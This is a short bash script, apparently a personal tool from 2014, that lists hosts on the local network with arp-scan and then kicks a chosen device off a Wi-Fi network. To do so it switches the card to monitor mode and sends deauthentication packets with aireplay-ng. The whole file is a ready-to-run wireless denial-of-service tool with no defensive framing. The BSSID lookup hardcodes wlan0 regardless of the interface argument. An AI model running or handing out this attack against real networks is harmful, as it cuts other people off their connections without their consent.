#!/bin/bash

#
# kick.sh <network interface> |<host bssid>|
#
# Andriy Rudyk (arudyk.dev@gmail.com)
# 06/18/2014
#

NIC=$1       # Network interface
HOST_MAC=$2  # Host to be kicked
BSSID=$(iwconfig wlan0 | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}')

# MAC version
#BSSID=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I en1 | grep BSSID | cut -d" " -f12)

#
# Scans the localnet for all connected hosts.
#
function scan {
    arp-scan -I $NIC -l # Scans localnet for all connected hosts.
}

#
# Kicks a specified host from the network by sending de-auth packet.
#
function kick {
    airmon-ng stop mon0  # Kill any monitoring device
    airmon-ng start $NIC # Start monitoring mode

    echo "[!] Kicking $HOST_MAC from $BSSID"
    aireplay-ng -0 1 -a $BSSID -c $HOST_MAC mon0 --ignore-negative-one
}

#
# Entry into the script, parse args.
#
# $1 - Network interface (i.e. wlan0)
# $2 - Host BSSID that shall be kicked
#

if [ $# -eq 1 ]; then
    scan
elif [ $# -eq 2 ]; then
    kick
else
    echo -e "Usage:\n"
    echo "SCAN: kick.sh <network interface>"
    echo "KICK: kick.sh <network interface> <target BSSID>"
fi
